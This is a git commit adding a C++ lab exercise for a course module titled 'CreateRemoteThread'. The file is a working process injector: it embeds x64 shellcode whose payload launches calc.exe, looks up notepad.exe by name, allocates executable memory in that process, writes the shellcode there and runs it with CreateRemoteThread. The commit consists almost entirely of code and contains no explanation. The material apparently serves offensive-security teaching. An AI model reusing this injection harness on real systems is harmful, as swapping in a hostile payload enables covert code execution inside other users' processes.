0b32a213607e588fa25efb30c931e9c11469b41a
john-rop <187274626+john-rop@users.noreply.github.com>
2025-05-27 18:17:59 -0700

    Add Lab 7 - CreateRemoteThread content from CenturyYoung

---
+++ Exercise 2/CreatRemoteThread-NoExit.cpp
@@ -0,0 +1,74 @@
+#include "Windows.h"
+#include <tlhelp32.h>
+
+int main()
+{
+	unsigned char shellcode[] =
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+"\x63\x2e\x65\x78\x65\x00";
+
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+
+	// find process ID by process name
+
+	const wchar_t* procname = L"notepad.exe";
+
+		HANDLE hSnapshot;
+		PROCESSENTRY32 pe;
+		int pid = 0;
+		BOOL hResult;
+
+		// snapshot of all processes in the system
+		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+		// initializing size: needed for using Process32First
+		pe.dwSize = sizeof(PROCESSENTRY32);
+
+		// info about first process encountered in a system snapshot
+		hResult = Process32First(hSnapshot, &pe);
+
+		// retrieve information about the processes
+		// and exit if unsuccessful
+		while (hResult) {
+			// if we find the process: return process ID
+			if (_wcsicmp(procname, pe.szExeFile) == 0) {
+				pid = pe.th32ProcessID;
+				break;
+			}
+			hResult = Process32Next(hSnapshot, &pe);
+		}
+
+		// closes an open handle (CreateToolhelp32Snapshot)
+		CloseHandle(hSnapshot);
+	
+
+	//DWORD pnameid = GetCurrentProcessId();
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+	system("pause");
+	return 0;
+}
